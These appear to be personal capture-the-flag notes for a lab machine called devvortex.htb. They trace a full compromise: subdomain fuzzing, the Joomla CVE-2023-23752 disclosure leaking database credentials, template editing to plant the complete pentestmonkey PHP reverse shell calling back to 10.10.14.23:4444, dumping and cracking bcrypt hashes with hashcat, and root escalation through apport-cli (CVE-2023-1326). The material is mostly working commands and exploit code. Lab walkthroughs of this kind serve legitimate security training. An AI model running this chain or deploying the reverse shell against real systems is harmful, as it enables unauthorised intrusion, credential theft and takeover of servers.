# ip
10.10.11.242

# subdomains
wfuzz -c -w ../../../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST:FUZZ.devvortex.htb" http://devvortex.htb
http://dev.devvortex.htb/

# info website
Joomla! 4.x
4.2.6

# exploit CVE-2023-23753
curl -v http://dev.devvortex.htb/api/index.php/v1/users?public=true

# users info
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

# exploit CVE-2023-23752
python3 CVE-2023-23752.py -u dev.devvortex.htb
User: lewis Password: P4ntherg0t1n5r3c0n## Database: joomla

# url template
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=aG9tZQ==&isMedia=0

# rev shell php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.23';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

# exploit php rce hacktricks
http://dev.devvortex.htb/templates/cassiopeia/error.php

# public secret
ZI7zLTbaGKliS9gq


<?php die("Access Denied"); ?>#x#a:2:{s:6:"result";s:32:"6d9102be74261b5507f9cadb93821b15";s:6:"output";s:0:"";}$

# connection mysql www-data
mysql -u lewis -p joomla
show databases;
show tables;
describe sd4fg_users
select id,username,password from sd4fg_users;

# password mysql logan, lewis
id      username        password
649     lewis   $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
650     logan   $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

# hashcat command
hashcat -m 3200 -O -w 4 hash /usr/share/wordlists/rockyou.txt

# pass bcrypt
tequieromucho

# root poc
https://github.com/diego-tella/CVE-2023-1326-PoC?tab=readme-ov-file

# exploit
sudo /usr/bin/apport-cli -f /var/crash/_usr_bin_sleep.1000.crash
/var/crash/_usr_bin_sleep.1000.crash
4
V
/bin/bash -i